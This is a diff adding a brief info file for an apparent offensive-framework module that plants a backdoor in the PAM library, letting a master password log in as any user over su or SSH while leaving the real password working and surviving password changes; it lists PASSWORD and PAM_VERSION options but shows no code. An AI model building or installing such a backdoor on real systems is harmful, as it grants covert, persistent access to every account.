@@ -1,0 +1,13 @@
+            
+    ### PAM SSH Backdoor Module Info File ###
+
+    This module creates backdoor in PAM library that allows authenticating with master password 
+    to any user account via su, SSH or any other mechanism that uses PAM library. Master password 
+    and correct user's password work correctly at the same time. User's password change does not 
+    affect backdoor.
+    
+    OPTIONS:
+    
+    PASSWORD        Required: NO    Master password
+    PAM_VERSION     Required: NO    PAM version present on system
+
